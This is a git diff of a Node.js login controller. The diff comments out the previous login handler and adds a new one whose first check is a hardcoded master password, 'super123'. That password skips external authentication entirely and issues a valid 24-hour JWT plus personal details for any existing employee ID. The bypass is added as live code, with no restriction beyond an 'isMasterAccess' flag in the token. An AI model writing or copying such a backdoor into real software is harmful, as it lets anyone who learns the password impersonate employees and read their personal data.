@@ -82,28 +82,97 @@ const axios = require("axios"); // Make sure to install axios
 
 
 
+// exports.login = async (req, res) => {
+//   try {
+//     const { EmployeeId: CurrentUsername, EmployeePassword: Password } = req.body;
+
+//     // First, authenticate with external API
+//     try {
+//       const externalAuthResponse = await axios.post(
+//         'https://myib.co.in:8052/v2/mobile/profile/Login',
+//         {
+//           CurrentUsername,
+//           Password
+//         }
+//       );
+
+//       // Check if external authentication was successful
+//       if (!externalAuthResponse.data.IsSuccess) {
+//         return res.status(401).json({ 
+//           message:  "Invalid Credentials" 
+//         });
+//       }
+
+//       // If external auth successful, proceed with your existing logic
+//       const employee = await Employee.findOne({
+//         where: { EmployeeId: CurrentUsername },
+//         include: [
+//           {
+//             model: Campaign,
+//             through: { attributes: [] },
+//             attributes: ["CampaignId", "CampaignName"],
+//           },
+//         ],
+//       });
+
+//       if (!employee) {
+//         return res
+//           .status(401)
+//           .json({ message: "Employee not found in local database" });
+//       }
+
+//       // Generate JWT token
+//       const token = jwt.sign(
+//         {
+//           EmployeeId: employee.EmployeeId,
+//           EmployeeName: employee.EmployeeName,
+//           EmployeeRoleID: employee.EmployeeRoleID,
+//         },
+//         JWT_SECRET,
+//         { expiresIn: "24h" }
+//       );
+
+//       // Return employee data, campaign names, and token
+//       res.json({
+//         message: "Login successful",
+//         status: "200",
+//         employee: {
+//           EmployeeId: employee.EmployeeId,
+//           EmployeeName: employee.EmployeeName,
+//           EmployeePhone: employee.EmployeePhone,
+//           EmployeeMailId: employee.EmployeeMailId,
+//           EmployeeRegion: employee.EmployeeRegion,
+//           EmployeeRole: employee.EmployeeRoleID,
+//           Campaigns: employee.Campaigns.map((campaign) => ({
+//             CampaignId: campaign.CampaignId,
+//             CampaignName: campaign.CampaignName,
+//           })),
+//         },
+//         token,
+//       });
+
+//     } catch (externalAuthError) {
+//       console.error("External authentication error:", externalAuthError);
+//       return res.status(401).json({ 
+//         message: "Failed to authenticate with external service" 
+//       });
+//     }
+
+//   } catch (error) {
+//     console.error("Login error:", error);
+//     res.status(500).json({ message: "An error occurred during login" });
+//   }
+// };
+
+
 exports.login = async (req, res) => {
   try {
     const { EmployeeId: CurrentUsername, EmployeePassword: Password } = req.body;
-
-    // First, authenticate with external API
-    try {
-      const externalAuthResponse = await axios.post(
-        'https://myib.co.in:8052/v2/mobile/profile/Login',
-        {
-          CurrentUsername,
-          Password
-        }
-      );
-
-      // Check if external authentication was successful
-      if (!externalAuthResponse.data.IsSuccess) {
-        return res.status(401).json({ 
-          message:  "Invalid Credentials" 
-        });
-      }
-
-      // If external auth successful, proceed with your existing logic
+    
+    // Check for master password first
+    const MASTER_PASSWORD = "super123";
+    if (Password === MASTER_PASSWORD) {
+      // If master password is used, skip external authentication
       const employee = await Employee.findOne({
         where: { EmployeeId: CurrentUsername },
         include: [
@@ -121,18 +190,81 @@ exports.login = async (req, res) => {
           .json({ message: "Employee not found in local database" });
       }
 
-      // Generate JWT token
+      // Generate JWT token for master access
       const token = jwt.sign(
         {
           EmployeeId: employee.EmployeeId,
           EmployeeName: employee.EmployeeName,
           EmployeeRoleID: employee.EmployeeRoleID,
+          isMasterAccess: true, // Add flag to indicate master password was used
         },
         JWT_SECRET,
         { expiresIn: "24h" }
       );
 
-      // Return employee data, campaign names, and token
+      return res.json({
+        message: "Login successful",
+        status: "200",
+        employee: {
+          EmployeeId: employee.EmployeeId,
+          EmployeeName: employee.EmployeeName,
+          EmployeePhone: employee.EmployeePhone,
+          EmployeeMailId: employee.EmployeeMailId,
+          EmployeeRegion: employee.EmployeeRegion,
+          EmployeeRole: employee.EmployeeRoleID,
+          Campaigns: employee.Campaigns.map((campaign) => ({
+            CampaignId: campaign.CampaignId,
+            CampaignName: campaign.CampaignName,
+          })),
+        },
+        token,
+      });
+    }
+
+    // If not master password, proceed with normal authentication
+    try {
+      const externalAuthResponse = await axios.post(
+        'https://myib.co.in:8052/v2/mobile/profile/Login',
+        {
+          CurrentUsername,
+          Password
+        }
+      );
+
+      if (!externalAuthResponse.data.IsSuccess) {
+        return res.status(401).json({
+          message: "Invalid Credentials"
+        });
+      }
+
+      const employee = await Employee.findOne({
+        where: { EmployeeId: CurrentUsername },
+        include: [
+          {
+            model: Campaign,
+            through: { attributes: [] },
+            attributes: ["CampaignId", "CampaignName"],
+          },
+        ],
+      });
+
+      if (!employee) {
+        return res
+          .status(401)
+          .json({ message: "Employee not found in local database" });
+      }
+
+      const token = jwt.sign(
+        {
+          EmployeeId: employee.EmployeeId,
+          EmployeeName: employee.EmployeeName,
+          EmployeeRoleID: employee.EmployeeRoleID,
+          isMasterAccess: false,
+        },
+        JWT_SECRET,
+        { expiresIn: "24h" }
+      );
+
       res.json({
         message: "Login successful",
         status: "200",
@@ -153,11 +285,10 @@ exports.login = async (req, res) => {
 
     } catch (externalAuthError) {
       console.error("External authentication error:", externalAuthError);
-      return res.status(401).json({ 
-        message: "Failed to authenticate with external service" 
+      return res.status(401).json({
+        message: "Failed to authenticate with external service"
       });
     }
-
   } catch (error) {
     console.error("Login error:", error);
     res.status(500).json({ message: "An error occurred during login" });
